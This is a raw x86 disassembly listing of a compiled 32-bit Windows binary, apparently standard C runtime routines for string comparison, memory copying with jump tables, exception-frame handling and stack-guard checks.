  42820b:	mov    ebx,ecx
  42820d:	mov    edi,DWORD PTR [ebp+0x8]
  428210:	mov    esi,edi
  428212:	xor    eax,eax
  428214:	repnz scas al,BYTE PTR es:[edi]
  428216:	neg    ecx
  428218:	add    ecx,ebx
  42821a:	mov    edi,esi
  42821c:	mov    esi,DWORD PTR [ebp+0xc]
  42821f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428221:	mov    al,BYTE PTR [esi-0x1]
  428224:	xor    ecx,ecx
  428226:	cmp    al,BYTE PTR [edi-0x1]
  428229:	ja     0x428230
  42822b:	je     0x428232
  42822d:	sub    ecx,0x2
  428230:	not    ecx
  428232:	mov    eax,ecx
  428234:	pop    ebx
  428235:	pop    esi
  428236:	pop    edi
  428237:	leave  
  428238:	ret    
  428239:	int3   
  42823a:	int3   
  42823b:	int3   
  42823c:	int3   
  42823d:	int3   
  42823e:	int3   
  42823f:	int3   
  428240:	push   ebp
  428241:	mov    ebp,esp
  428243:	push   esi
  428244:	xor    eax,eax
  428246:	push   eax
  428247:	push   eax
  428248:	push   eax
  428249:	push   eax
  42824a:	push   eax
  42824b:	push   eax
  42824c:	push   eax
  42824d:	push   eax
  42824e:	mov    edx,DWORD PTR [ebp+0xc]
  428251:	lea    ecx,[ecx+0x0]
  428254:	mov    al,BYTE PTR [edx]
  428256:	or     al,al
  428258:	je     0x428263
  42825a:	add    edx,0x1
  42825d:	bts    DWORD PTR [esp],eax
  428261:	jmp    0x428254
  428263:	mov    esi,DWORD PTR [ebp+0x8]
  428266:	mov    edi,edi
  428268:	mov    al,BYTE PTR [esi]
  42826a:	or     al,al
  42826c:	je     0x42827a
  42826e:	add    esi,0x1
  428271:	bt     DWORD PTR [esp],eax
  428275:	jae    0x428268
  428277:	lea    eax,[esi-0x1]
  42827a:	add    esp,0x20
  42827d:	pop    esi
  42827e:	leave  
  42827f:	ret    
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   ebx
  428284:	push   esi
  428285:	push   edi
  428286:	push   ebp
  428287:	push   0x0
  428289:	push   0x0
  42828b:	push   0x428298
  428290:	push   DWORD PTR [ebp+0x8]
  428293:	call   0x428d0e
  428298:	pop    ebp
  428299:	pop    edi
  42829a:	pop    esi
  42829b:	pop    ebx
  42829c:	mov    esp,ebp
  42829e:	pop    ebp
  42829f:	ret    
  4282a0:	mov    ecx,DWORD PTR [esp+0x4]
  4282a4:	test   DWORD PTR [ecx+0x4],0x6
  4282ab:	mov    eax,0x1
  4282b0:	je     0x4282c1
  4282b2:	mov    eax,DWORD PTR [esp+0x8]
  4282b6:	mov    edx,DWORD PTR [esp+0x10]
  4282ba:	mov    DWORD PTR [edx],eax
  4282bc:	mov    eax,0x3
  4282c1:	ret    
  4282c2:	push   ebx
  4282c3:	push   esi
  4282c4:	push   edi
  4282c5:	mov    eax,DWORD PTR [esp+0x10]
  4282c9:	push   eax
  4282ca:	push   0xfffffffe
  4282cc:	push   0x4282a0
  4282d1:	push   DWORD PTR fs:0x0
  4282d8:	mov    DWORD PTR fs:0x0,esp
  4282df:	mov    eax,DWORD PTR [esp+0x20]
  4282e3:	mov    ebx,DWORD PTR [eax+0x8]
  4282e6:	mov    esi,DWORD PTR [eax+0xc]
  4282e9:	cmp    esi,0xffffffff
  4282ec:	je     0x42831c
  4282ee:	cmp    esi,DWORD PTR [esp+0x24]
  4282f2:	je     0x42831c
  4282f4:	lea    esi,[esi+esi*2]
  4282f7:	mov    ecx,DWORD PTR [ebx+esi*4]
  4282fa:	mov    DWORD PTR [esp+0x8],ecx
  4282fe:	mov    DWORD PTR [eax+0xc],ecx
  428301:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428306:	jne    0x42831a
  428308:	push   0x101
  42830d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428311:	call   0x428356
  428316:	call   DWORD PTR [ebx+esi*4+0x8]
  42831a:	jmp    0x4282df
  42831c:	pop    DWORD PTR fs:0x0
  428323:	add    esp,0xc
  428326:	pop    edi
  428327:	pop    esi
  428328:	pop    ebx
  428329:	ret    
  42832a:	xor    eax,eax
  42832c:	mov    ecx,DWORD PTR fs:0x0
  428333:	cmp    DWORD PTR [ecx+0x4],0x4282a0
  42833a:	jne    0x42834c
  42833c:	mov    edx,DWORD PTR [ecx+0xc]
  42833f:	mov    edx,DWORD PTR [edx+0xc]
  428342:	cmp    DWORD PTR [ecx+0x8],edx
  428345:	jne    0x42834c
  428347:	mov    eax,0x1
  42834c:	ret    
  42834d:	push   ebx
  42834e:	push   ecx
  42834f:	mov    ebx,0x46344c
  428354:	jmp    0x428360
  428356:	push   ebx
  428357:	push   ecx
  428358:	mov    ebx,0x46344c
  42835d:	mov    ecx,DWORD PTR [ebp+0x8]
  428360:	mov    DWORD PTR [ebx+0x8],ecx
  428363:	mov    DWORD PTR [ebx+0x4],eax
  428366:	mov    DWORD PTR [ebx+0xc],ebp
  428369:	pop    ecx
  42836a:	pop    ebx
  42836b:	ret    0x4
  42836e:	int3   
  42836f:	int3   
  428370:	push   ebp
  428371:	mov    ebp,esp
  428373:	push   edi
  428374:	push   esi
  428375:	mov    esi,DWORD PTR [ebp+0xc]
  428378:	mov    ecx,DWORD PTR [ebp+0x10]
  42837b:	mov    edi,DWORD PTR [ebp+0x8]
  42837e:	mov    eax,ecx
  428380:	mov    edx,ecx
  428382:	add    eax,esi
  428384:	cmp    edi,esi
  428386:	jbe    0x428390
  428388:	cmp    edi,eax
  42838a:	jb     0x42850c
  428390:	test   edi,0x3
  428396:	jne    0x4283ac
  428398:	shr    ecx,0x2
  42839b:	and    edx,0x3
  42839e:	cmp    ecx,0x8
  4283a1:	jb     0x4283cc
  4283a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283a5:	jmp    DWORD PTR [edx*4+0x4284bc]
  4283ac:	mov    eax,edi
  4283ae:	mov    edx,0x3
  4283b3:	sub    ecx,0x4
  4283b6:	jb     0x4283c4
  4283b8:	and    eax,0x3
  4283bb:	add    ecx,eax
  4283bd:	jmp    DWORD PTR [eax*4+0x4283d0]
  4283c4:	jmp    DWORD PTR [ecx*4+0x4284cc]
  4283cb:	nop
  4283cc:	jmp    DWORD PTR [ecx*4+0x428450]
  4283d3:	nop
  4283d4:	loopne 0x428359
  4283d6:	inc    edx
  4283d7:	add    BYTE PTR [esp+eax*4],cl
  4283da:	inc    edx
  4283db:	add    BYTE PTR [eax],dh
  4283dd:	test   BYTE PTR [edx+0x0],al
  4283e0:	and    edx,ecx
  4283e2:	mov    al,BYTE PTR [esi]
  4283e4:	mov    BYTE PTR [edi],al
  4283e6:	mov    al,BYTE PTR [esi+0x1]
  4283e9:	mov    BYTE PTR [edi+0x1],al
  4283ec:	mov    al,BYTE PTR [esi+0x2]
  4283ef:	shr    ecx,0x2
  4283f2:	mov    BYTE PTR [edi+0x2],al
  4283f5:	add    esi,0x3
  4283f8:	add    edi,0x3
  4283fb:	cmp    ecx,0x8
  4283fe:	jb     0x4283cc
  428400:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428402:	jmp    DWORD PTR [edx*4+0x4284bc]
  428409:	lea    ecx,[ecx+0x0]
  42840c:	and    edx,ecx
  42840e:	mov    al,BYTE PTR [esi]
  428410:	mov    BYTE PTR [edi],al
  428412:	mov    al,BYTE PTR [esi+0x1]
  428415:	shr    ecx,0x2
  428418:	mov    BYTE PTR [edi+0x1],al
  42841b:	add    esi,0x2
  42841e:	add    edi,0x2
  428421:	cmp    ecx,0x8
  428424:	jb     0x4283cc
  428426:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428428:	jmp    DWORD PTR [edx*4+0x4284bc]
  42842f:	nop
  428430:	and    edx,ecx
  428432:	mov    al,BYTE PTR [esi]
  428434:	mov    BYTE PTR [edi],al
  428436:	add    esi,0x1
  428439:	shr    ecx,0x2
  42843c:	add    edi,0x1
  42843f:	cmp    ecx,0x8
  428442:	jb     0x4283cc
  428444:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428446:	jmp    DWORD PTR [edx*4+0x4284bc]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    bl,0x84
  428452:	inc    edx
  428453:	add    BYTE PTR [eax-0x67ffbd7c],ah
  428459:	test   BYTE PTR [edx+0x0],al
  42845c:	nop
  42845d:	test   BYTE PTR [edx+0x0],al
  428460:	mov    BYTE PTR [edx+eax*2+0x42848000],al
  428467:	add    BYTE PTR [eax-0x7c],bh
  42846a:	inc    edx
  42846b:	add    BYTE PTR [eax-0x7c],dh
  42846e:	inc    edx
  42846f:	add    BYTE PTR [ebx-0x761b71bc],cl
  428475:	inc    esp
  428476:	(bad)  
  428477:	in     al,0x8b
  428479:	inc    esp
  42847a:	mov    gs,eax
  42847c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428480:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428484:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428488:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42848c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  428490:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  428494:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  428498:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42849c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4284a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4284a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4284a8:	lea    eax,[ecx*4+0x0]
  4284af:	add    esi,eax
  4284b1:	add    edi,eax
  4284b3:	jmp    DWORD PTR [edx*4+0x4284bc]
  4284ba:	mov    edi,edi
  4284bc:	int3   
  4284bd:	test   BYTE PTR [edx+0x0],al
  4284c0:	aam    0x84
  4284c2:	inc    edx
  4284c3:	add    al,ah
  4284c5:	test   BYTE PTR [edx+0x0],al
  4284c8:	hlt    
  4284c9:	test   BYTE PTR [edx+0x0],al
  4284cc:	mov    eax,DWORD PTR [ebp+0x8]
  4284cf:	pop    esi
  4284d0:	pop    edi
  4284d1:	leave  
  4284d2:	ret    
  4284d3:	nop
  4284d4:	mov    al,BYTE PTR [esi]
  4284d6:	mov    BYTE PTR [edi],al
  4284d8:	mov    eax,DWORD PTR [ebp+0x8]
  4284db:	pop    esi
  4284dc:	pop    edi
  4284dd:	leave  
  4284de:	ret    
  4284df:	nop
  4284e0:	mov    al,BYTE PTR [esi]
  4284e2:	mov    BYTE PTR [edi],al
  4284e4:	mov    al,BYTE PTR [esi+0x1]
  4284e7:	mov    BYTE PTR [edi+0x1],al
  4284ea:	mov    eax,DWORD PTR [ebp+0x8]
  4284ed:	pop    esi
  4284ee:	pop    edi
  4284ef:	leave  
  4284f0:	ret    
  4284f1:	lea    ecx,[ecx+0x0]
  4284f4:	mov    al,BYTE PTR [esi]
  4284f6:	mov    BYTE PTR [edi],al
  4284f8:	mov    al,BYTE PTR [esi+0x1]
  4284fb:	mov    BYTE PTR [edi+0x1],al
  4284fe:	mov    al,BYTE PTR [esi+0x2]
  428501:	mov    BYTE PTR [edi+0x2],al
  428504:	mov    eax,DWORD PTR [ebp+0x8]
  428507:	pop    esi
  428508:	pop    edi
  428509:	leave  
  42850a:	ret    
  42850b:	nop
  42850c:	lea    esi,[ecx+esi*1-0x4]
  428510:	lea    edi,[ecx+edi*1-0x4]
  428514:	test   edi,0x3
  42851a:	jne    0x428540
  42851c:	shr    ecx,0x2
  42851f:	and    edx,0x3
  428522:	cmp    ecx,0x8
  428525:	jb     0x428534
  428527:	std    
  428528:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42852a:	cld    
  42852b:	jmp    DWORD PTR [edx*4+0x428658]
  428532:	mov    edi,edi
  428534:	neg    ecx
  428536:	jmp    DWORD PTR [ecx*4+0x428608]
  42853d:	lea    ecx,[ecx+0x0]
  428540:	mov    eax,edi
  428542:	mov    edx,0x3
  428547:	cmp    ecx,0x4
  42854a:	jb     0x428558
  42854c:	and    eax,0x3
  42854f:	sub    ecx,eax
  428551:	jmp    DWORD PTR [eax*4+0x42855c]
  428558:	jmp    DWORD PTR [ecx*4+0x428658]
  42855f:	nop
  428560:	ins    BYTE PTR es:[edi],dx
  428561:	test   DWORD PTR [edx+0x0],eax
  428564:	nop
  428565:	test   DWORD PTR [edx+0x0],eax
  428568:	mov    eax,0x8a004285
  42856d:	inc    esi
  42856e:	add    esp,DWORD PTR [ebx]
  428570:	ror    DWORD PTR [eax-0x117cfcb9],1
  428576:	add    ecx,eax
  428578:	jmp    0x232087f
  42857d:	cmp    ecx,0x8
  428580:	jb     0x428534
  428582:	std    
  428583:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428585:	cld    
  428586:	jmp    DWORD PTR [edx*4+0x428658]
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	and    edx,ecx
  428595:	mov    BYTE PTR [edi+0x3],al
  428598:	mov    al,BYTE PTR [esi+0x2]
  42859b:	shr    ecx,0x2
  42859e:	mov    BYTE PTR [edi+0x2],al
  4285a1:	sub    esi,0x2
  4285a4:	sub    edi,0x2
  4285a7:	cmp    ecx,0x8
  4285aa:	jb     0x428534
  4285ac:	std    
  4285ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285af:	cld    
  4285b0:	jmp    DWORD PTR [edx*4+0x428658]
  4285b7:	nop
  4285b8:	mov    al,BYTE PTR [esi+0x3]
  4285bb:	and    edx,ecx
  4285bd:	mov    BYTE PTR [edi+0x3],al
  4285c0:	mov    al,BYTE PTR [esi+0x2]
  4285c3:	mov    BYTE PTR [edi+0x2],al
  4285c6:	mov    al,BYTE PTR [esi+0x1]
  4285c9:	shr    ecx,0x2
  4285cc:	mov    BYTE PTR [edi+0x1],al
  4285cf:	sub    esi,0x3
  4285d2:	sub    edi,0x3
  4285d5:	cmp    ecx,0x8
  4285d8:	jb     0x428534
  4285de:	std    
  4285df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285e1:	cld    
  4285e2:	jmp    DWORD PTR [edx*4+0x428658]
  4285e9:	lea    ecx,[ecx+0x0]
  4285ec:	or     al,0x86
  4285ee:	inc    edx
  4285ef:	add    BYTE PTR [esi+eax*4],dl
  4285f2:	inc    edx
  4285f3:	add    BYTE PTR [esi+eax*4],bl
  4285f6:	inc    edx
  4285f7:	add    BYTE PTR [esi+eax*4],ah
  4285fa:	inc    edx
  4285fb:	add    BYTE PTR [esi+eax*4],ch
  4285fe:	inc    edx
  4285ff:	add    BYTE PTR [esi+eax*4],dh
  428602:	inc    edx
  428603:	add    BYTE PTR [esi+eax*4],bh
  428606:	inc    edx
  428607:	add    BYTE PTR [edi-0x7a],cl
  42860a:	inc    edx
  42860b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428611:	inc    esp
  428612:	(bad)  
  428613:	sbb    al,0x8b
  428615:	inc    esp
  428616:	mov    ds,WORD PTR [eax]
  428618:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42861c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428620:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428624:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428628:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42862c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428630:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428634:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428638:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42863c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428640:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428644:	lea    eax,[ecx*4+0x0]
  42864b:	add    esi,eax
  42864d:	add    edi,eax
  42864f:	jmp    DWORD PTR [edx*4+0x428658]
  428656:	mov    edi,edi
  428658:	push   0x70004286
  42865d:	xchg   BYTE PTR [edx+0x0],al
  428660:	add    BYTE PTR [esi-0x796bffbe],0x42
  428667:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42866d:	leave  
  42866e:	ret    
  42866f:	nop
  428670:	mov    al,BYTE PTR [esi+0x3]
  428673:	mov    BYTE PTR [edi+0x3],al
  428676:	mov    eax,DWORD PTR [ebp+0x8]
  428679:	pop    esi
  42867a:	pop    edi
  42867b:	leave  
  42867c:	ret    
  42867d:	lea    ecx,[ecx+0x0]
  428680:	mov    al,BYTE PTR [esi+0x3]
  428683:	mov    BYTE PTR [edi+0x3],al
  428686:	mov    al,BYTE PTR [esi+0x2]
  428689:	mov    BYTE PTR [edi+0x2],al
  42868c:	mov    eax,DWORD PTR [ebp+0x8]
  42868f:	pop    esi
  428690:	pop    edi
  428691:	leave  
  428692:	ret    
  428693:	nop
  428694:	mov    al,BYTE PTR [esi+0x3]
  428697:	mov    BYTE PTR [edi+0x3],al
  42869a:	mov    al,BYTE PTR [esi+0x2]
  42869d:	mov    BYTE PTR [edi+0x2],al
  4286a0:	mov    al,BYTE PTR [esi+0x1]
  4286a3:	mov    BYTE PTR [edi+0x1],al
  4286a6:	mov    eax,DWORD PTR [ebp+0x8]
  4286a9:	pop    esi
  4286aa:	pop    edi
  4286ab:	leave  
  4286ac:	ret    
  4286ad:	push   ebp
  4286ae:	mov    ebp,esp
  4286b0:	sub    esp,0xc
  4286b3:	mov    eax,ds:0x462f30
  4286b8:	xor    eax,DWORD PTR [ebp+0x4]
  4286bb:	and    BYTE PTR [ebp-0x6],0x0
  4286bf:	push   0x6
  4286c1:	mov    DWORD PTR [ebp-0x4],eax
  4286c4:	lea    eax,[ebp-0xc]
  4286c7:	push   eax
  4286c8:	push   0x1004
  4286cd:	push   DWORD PTR [ebp+0x8]
  4286d0:	call   DWORD PTR ds:0x429138
  4286d6:	test   eax,eax
  4286d8:	jne    0x4286df
  4286da:	or     eax,0xffffffff
  4286dd:	jmp    0x4286e9
  4286df:	lea    eax,[ebp-0xc]
  4286e2:	push   eax
  4286e3:	call   0x4289ee
  4286e8:	pop    ecx
  4286e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4286ec:	xor    ecx,DWORD PTR [ebp+0x4]
  4286ef:	call   0x425afc
  4286f4:	leave  
  4286f5:	ret    
  4286f6:	push   0x38
  4286f8:	push   0x42a000
  4286fd:	call   0x425434
  428702:	mov    eax,ds:0x462f30
  428707:	xor    eax,DWORD PTR [ebp+0x4]
  42870a:	mov    DWORD PTR [ebp-0x1c],eax
  42870d:	xor    edi,edi
  42870f:	mov    DWORD PTR [ebp-0x20],edi
  428712:	mov    DWORD PTR [ebp-0x24],edi
  428715:	mov    eax,DWORD PTR [ebp+0x14]
  428718:	mov    ebx,DWORD PTR [eax]
  42871a:	mov    DWORD PTR [ebp-0x28],ebx
  42871d:	mov    DWORD PTR [ebp-0x2c],edi
  428720:	mov    eax,DWORD PTR [ebp+0x8]
  428723:	cmp    eax,DWORD PTR [ebp+0xc]
  428726:	je     0x42889f
  42872c:	lea    ecx,[ebp-0x40]
  42872f:	push   ecx
  428730:	push   eax
  428731:	mov    esi,DWORD PTR ds:0x429104
  428737:	call   esi
  428739:	test   eax,eax
  42873b:	je     0x42875d
  42873d:	cmp    DWORD PTR [ebp-0x40],0x1
  428741:	jne    0x42875d
  428743:	lea    eax,[ebp-0x40]
  428746:	push   eax
  428747:	push   DWORD PTR [ebp+0xc]
  42874a:	call   esi
  42874c:	test   eax,eax
  42874e:	je     0x42875d
  428750:	cmp    DWORD PTR [ebp-0x40],0x1
  428754:	jne    0x42875d
  428756:	mov    DWORD PTR [ebp-0x2c],0x1
  42875d:	cmp    DWORD PTR [ebp-0x2c],edi
  428760:	je     0x42877c
  428762:	cmp    ebx,0xffffffff
  428765:	je     0x42876b
  428767:	mov    esi,ebx
  428769:	jmp    0x428777
  42876b:	push   DWORD PTR [ebp+0x10]
  42876e:	call   0x425a40
  428773:	pop    ecx
  428774:	mov    esi,eax
  428776:	inc    esi
  428777:	mov    DWORD PTR [ebp-0x44],esi
  42877a:	jmp    0x42877f
  42877c:	mov    esi,DWORD PTR [ebp-0x44]
  42877f:	cmp    DWORD PTR [ebp-0x2c],edi
  428782:	jne    0x42879e
  428784:	push   edi
  428785:	push   edi
  428786:	push   ebx
  428787:	push   DWORD PTR [ebp+0x10]
  42878a:	push   0x1
  42878c:	push   DWORD PTR [ebp+0x8]
  42878f:	call   DWORD PTR ds:0x429128
  428795:	mov    esi,eax
  428797:	mov    DWORD PTR [ebp-0x44],esi
  42879a:	cmp    esi,edi
  42879c:	je     0x4287f6
  42879e:	mov    DWORD PTR [ebp-0x4],edi
  4287a1:	lea    eax,[esi+esi*1]
  4287a4:	add    eax,0x3
  4287a7:	and    eax,0xfffffffc
  4287aa:	call   0x425480
  4287af:	mov    DWORD PTR [ebp-0x18],esp
  4287b2:	mov    ebx,esp
  4287b4:	mov    DWORD PTR [ebp-0x48],ebx
  4287b7:	lea    eax,[esi+esi*1]
  4287ba:	push   eax
  4287bb:	push   edi
  4287bc:	push   ebx
  4287bd:	call   0x427d30
  4287c2:	add    esp,0xc
  4287c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287c9:	jmp    0x4287e2
  4287cb:	xor    eax,eax
  4287cd:	inc    eax
  4287ce:	ret    
  4287cf:	mov    esp,DWORD PTR [ebp-0x18]
  4287d2:	call   0x4288c5
  4287d7:	xor    edi,edi
  4287d9:	xor    ebx,ebx
  4287db:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287df:	mov    esi,DWORD PTR [ebp-0x44]
  4287e2:	cmp    ebx,edi
  4287e4:	jne    0x428804
  4287e6:	push   esi
  4287e7:	push   0x2
  4287e9:	call   0x426548
  4287ee:	pop    ecx
  4287ef:	pop    ecx
  4287f0:	mov    ebx,eax
  4287f2:	cmp    ebx,edi
  4287f4:	jne    0x4287fd
  4287f6:	xor    eax,eax
  4287f8:	jmp    0x4288b1
  4287fd:	mov    DWORD PTR [ebp-0x24],0x1
  428804:	push   esi
  428805:	push   ebx
  428806:	push   DWORD PTR [ebp-0x28]
  428809:	push   DWORD PTR [ebp+0x10]
  42880c:	push   0x1
  42880e:	push   DWORD PTR [ebp+0x8]
  428811:	call   DWORD PTR ds:0x429128
  428817:	test   eax,eax
  428819:	je     0x4288a2
  42881f:	cmp    DWORD PTR [ebp+0x18],edi
  428822:	je     0x428844
  428824:	push   edi
  428825:	push   edi
  428826:	push   DWORD PTR [ebp+0x1c]
  428829:	push   DWORD PTR [ebp+0x18]
  42882c:	push   esi
  42882d:	push   ebx
  42882e:	push   edi
  42882f:	push   DWORD PTR [ebp+0xc]
  428832:	call   DWORD PTR ds:0x4290bc
  428838:	test   eax,eax
  42883a:	je     0x4288a2
  42883c:	mov    eax,DWORD PTR [ebp+0x18]
  42883f:	mov    DWORD PTR [ebp-0x20],eax
  428842:	jmp    0x4288a2
  428844:	cmp    DWORD PTR [ebp-0x2c],edi
  428847:	jne    0x42885f
  428849:	push   edi
  42884a:	push   edi
  42884b:	push   edi
  42884c:	push   edi
  42884d:	push   esi
  42884e:	push   ebx
  42884f:	push   edi
  428850:	push   DWORD PTR [ebp+0xc]
  428853:	call   DWORD PTR ds:0x4290bc
  428859:	mov    esi,eax
  42885b:	cmp    esi,edi
  42885d:	je     0x4288a2
  42885f:	push   esi
  428860:	push   0x1
  428862:	call   0x426548
  428867:	pop    ecx
  428868:	pop    ecx
  428869:	mov    DWORD PTR [ebp-0x20],eax
  42886c:	cmp    eax,edi
  42886e:	je     0x4288a2
  428870:	push   edi
  428871:	push   edi
  428872:	push   esi
  428873:	push   eax
  428874:	push   esi
  428875:	push   ebx
  428876:	push   edi
  428877:	push   DWORD PTR [ebp+0xc]
  42887a:	call   DWORD PTR ds:0x4290bc
  428880:	cmp    eax,edi
  428882:	jne    0x428892
  428884:	push   DWORD PTR [ebp-0x20]
  428887:	call   0x42603a
  42888c:	pop    ecx
  42888d:	mov    DWORD PTR [ebp-0x20],edi
  428890:	jmp    0x4288a2
  428892:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  428896:	je     0x4288a2
  428898:	mov    ecx,DWORD PTR [ebp+0x14]
  42889b:	mov    DWORD PTR [ecx],eax
  42889d:	jmp    0x4288a2
  42889f:	mov    ebx,DWORD PTR [ebp-0x48]
  4288a2:	cmp    DWORD PTR [ebp-0x24],edi
  4288a5:	je     0x4288ae
  4288a7:	push   ebx
  4288a8:	call   0x42603a
  4288ad:	pop    ecx
  4288ae:	mov    eax,DWORD PTR [ebp-0x20]
  4288b1:	lea    esp,[ebp-0x54]
  4288b4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4288b7:	xor    ecx,DWORD PTR [ebp+0x4]
  4288ba:	call   0x425afc
  4288bf:	call   0x42546f
  4288c4:	ret    
  4288c5:	push   ebp
  4288c6:	mov    ebp,esp
  4288c8:	sub    esp,0x48
  4288cb:	push   ebx
  4288cc:	push   esi
  4288cd:	push   edi
  4288ce:	push   0x4
  4288d0:	pop    eax
  4288d1:	call   0x425480
  4288d6:	mov    ebx,esp
  4288d8:	push   0x1c
  4288da:	lea    eax,[ebp-0x24]
  4288dd:	push   eax
  4288de:	push   ebx
  4288df:	call   DWORD PTR ds:0x429054
  4288e5:	test   eax,eax
  4288e7:	je     0x42895a
  4288e9:	mov    edi,DWORD PTR [ebp-0x20]
  4288ec:	lea    eax,[ebp-0x48]
  4288ef:	push   eax
  4288f0:	call   DWORD PTR ds:0x42908c
  4288f6:	mov    eax,DWORD PTR [ebp-0x44]
  4288f9:	lea    esi,[eax-0x1]
  4288fc:	not    esi
  4288fe:	and    esi,ebx
  428900:	sub    esi,eax
  428902:	mov    DWORD PTR [ebp-0x4],eax
  428905:	mov    eax,ds:0x4635c4
  42890a:	mov    ecx,eax
  42890c:	dec    ecx
  42890d:	neg    ecx
  42890f:	sbb    ecx,ecx
  428911:	and    ecx,0xffff1000
  428917:	add    ecx,0x11000
  42891d:	add    ecx,edi
  42891f:	cmp    esi,ecx
  428921:	jb     0x42895a
  428923:	cmp    eax,0x1
  428926:	je     0x428972
  428928:	mov    ebx,edi
  42892a:	mov    edi,0x1000
  42892f:	push   0x1c
  428931:	lea    eax,[ebp-0x24]
  428934:	push   eax
  428935:	push   ebx
  428936:	call   DWORD PTR ds:0x429054
  42893c:	test   eax,eax
  42893e:	je     0x42895a
  428940:	add    ebx,DWORD PTR [ebp-0x18]
  428943:	test   DWORD PTR [ebp-0x14],edi
  428946:	je     0x42892f
  428948:	test   BYTE PTR [ebp-0xf],0x1
  42894c:	mov    ebx,DWORD PTR [ebp-0x24]
  42894f:	je     0x428956
  428951:	xor    eax,eax
  428953:	inc    eax
  428954:	jmp    0x42898e
  428956:	cmp    esi,ebx
  428958:	jae    0x42895e
  42895a:	xor    eax,eax
  42895c:	jmp    0x42898e
  42895e:	push   0x4
  428960:	push   edi
  428961:	push   DWORD PTR [ebp-0x4]
  428964:	push   ebx
  428965:	call   DWORD PTR ds:0x429058
  42896b:	mov    eax,ds:0x4635c4
  428970:	jmp    0x428974
  428972:	mov    ebx,esi
  428974:	dec    eax
  428975:	neg    eax
  428977:	sbb    eax,eax
  428979:	and    eax,0x103
  42897e:	lea    ecx,[ebp-0x8]
  428981:	push   ecx
  428982:	inc    eax
  428983:	push   eax
  428984:	push   DWORD PTR [ebp-0x4]
  428987:	push   ebx
  428988:	call   DWORD PTR ds:0x42906c
  42898e:	lea    esp,[ebp-0x54]
  428991:	pop    edi
  428992:	pop    esi
  428993:	pop    ebx
  428994:	leave  
  428995:	ret    
  428996:	int3   
  428997:	int3   
  428998:	int3   
  428999:	int3   
  42899a:	int3   
  42899b:	int3   
  42899c:	int3   
  42899d:	int3   
  42899e:	int3   
  42899f:	int3   
  4289a0:	push   ebp
  4289a1:	mov    ebp,esp
  4289a3:	push   edi
  4289a4:	push   esi
  4289a5:	push   ebx
  4289a6:	mov    esi,DWORD PTR [ebp+0xc]
  4289a9:	mov    edi,DWORD PTR [ebp+0x8]
  4289ac:	mov    al,0xff
  4289ae:	mov    edi,edi
  4289b0:	or     al,al
  4289b2:	je     0x4289e6
  4289b4:	mov    al,BYTE PTR [esi]
  4289b6:	add    esi,0x1
  4289b9:	mov    ah,BYTE PTR [edi]
  4289bb:	add    edi,0x1
  4289be:	cmp    ah,al
  4289c0:	je     0x4289b0
  4289c2:	sub    al,0x41
  4289c4:	cmp    al,0x1a
  4289c6:	sbb    cl,cl
  4289c8:	and    cl,0x20
  4289cb:	add    al,cl
  4289cd:	add    al,0x41
  4289cf:	xchg   al,ah
  4289d1:	sub    al,0x41
  4289d3:	cmp    al,0x1a
  4289d5:	sbb    cl,cl
  4289d7:	and    cl,0x20
  4289da:	add    al,cl
  4289dc:	add    al,0x41
  4289de:	cmp    al,ah
  4289e0:	je     0x4289b0
  4289e2:	sbb    al,al
  4289e4:	sbb    al,0xff
  4289e6:	movsx  eax,al
  4289e9:	pop    ebx
  4289ea:	pop    esi
  4289eb:	pop    edi
  4289ec:	leave  
  4289ed:	ret    
  4289ee:	push   esi
  4289ef:	push   edi
  4289f0:	call   0x4252e9
  4289f5:	mov    edi,DWORD PTR [eax+0x64]
  4289f8:	cmp    edi,DWORD PTR ds:0x46308c
  4289fe:	je     0x428a07
  428a00:	call   0x42678f
  428a05:	mov    edi,eax
  428a07:	mov    esi,DWORD PTR [esp+0xc]
  428a0b:	cmp    DWORD PTR [edi+0x28],0x1
  428a0f:	movzx  eax,BYTE PTR [esi]
  428a12:	jle    0x428a22
  428a14:	push   0x8
  428a16:	push   eax
  428a17:	push   edi
  428a18:	call   0x428a76
  428a1d:	add    esp,0xc
  428a20:	jmp    0x428a2c
